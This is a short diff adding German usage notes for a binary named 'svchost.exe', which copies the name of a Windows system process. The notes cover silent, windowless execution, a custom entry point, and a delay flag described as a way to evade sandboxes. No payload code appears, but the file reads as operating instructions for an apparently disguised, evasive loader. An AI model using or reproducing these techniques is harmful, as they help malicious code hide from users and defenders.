@@ -1,0 +1,14 @@
+# Normale Ausführung (silent, kein Fenster)
+svchost.exe --silent
+
+# Mit Konsolenausgaben (für Tests)
+svchost.exe -v
+
+# Mit benutzerdefinierter Entry-Point Funktion
+svchost.exe -v -e Start
+
+# Mit Delay (um Sandbox zu umgehen)
+svchost.exe -v -d 2000
+
+# Komplett silent
+svchost.exe --silent
